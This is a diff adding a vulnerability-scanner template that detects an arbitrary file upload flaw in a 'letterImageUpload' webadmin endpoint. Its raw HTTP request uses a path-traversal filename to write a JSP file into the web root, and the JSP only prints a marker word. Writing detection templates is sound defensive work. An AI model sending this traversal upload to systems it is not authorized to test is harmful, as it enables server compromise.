@@ -1,0 +1,44 @@
+id: letter-image-upload-rce
+
+info:
+  name: Letter Image Upload RCE
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template checks for a vulnerability in the letterImageUpload functionality which allows arbitrary file upload leading to remote code execution.
+  tags: rce,file-upload
+
+http:
+  - raw:
+      - |
+        POST /webadmin/service/openapiservice?func=upload:letterImageUpload HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name="imageX"
+
+        0
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name="imageY"
+
+        0
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name="submit"
+
+        提交
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name="filename"; filename="../../../../../web/webmailsvr/admin/12.jsp"
+        Content-Type: text/plain
+
+        <% out.println("Vulnerable!"); %>
+        ------WebKitFormBoundary--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "Vulnerable!"
